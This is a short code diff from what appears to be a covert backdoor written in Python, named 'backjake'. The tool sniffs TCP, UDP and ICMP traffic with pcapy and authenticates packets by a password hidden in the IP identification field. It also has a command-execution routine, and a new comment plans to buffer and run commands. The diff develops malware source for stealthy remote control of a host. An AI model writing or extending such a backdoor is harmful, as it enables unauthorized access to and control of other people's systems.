@@ -9,7 +9,7 @@ import utils
 
 def recieveDatagram():
 	cap = pcapy.open_live(config.dev, 65536, 1, 0)
-	cap.setfilter(config.protocol)
+	cap.setfilter('tcp or udp or icmp')
 
 	while(backjake.running):
 		(header, packet) = cap.next()
@@ -66,7 +66,6 @@ def checkType(packet):
 		return 'udp'
 
 def authenticated(packet):	
-	print "checking packet"
 	ethLength = 14
 	ipLength = 20
 	ip = packet[ethLength:ipLength+ethLength]
@@ -76,6 +75,7 @@ def authenticated(packet):
 
 	# check ip identification field for encrypted password
  	if ipIdent == pswd:
+ 		## place in buffer, then execute when finished
  		print "auth!"
 
 def executeCommand(ip, proto, data):
